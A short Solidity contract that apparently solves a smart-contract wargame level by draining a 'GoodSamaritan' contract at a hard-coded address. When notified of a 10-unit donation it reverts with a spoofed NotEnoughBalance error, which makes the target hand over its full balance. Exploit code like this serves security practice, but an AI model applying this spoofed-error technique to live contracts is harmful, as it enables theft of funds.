// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
interface GoodSamaritan  {
    function requestDonation() external returns (bool enoughBalance) ;
}
contract INotifyable{
    GoodSamaritan target=GoodSamaritan(0x6135cF0a4A64F57b7d1D2eC4Df117C4007F135b9);
    error NotEnoughBalance();

    function call() public {
        target.requestDonation();


    }

    function notify(uint256 amount) public{
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
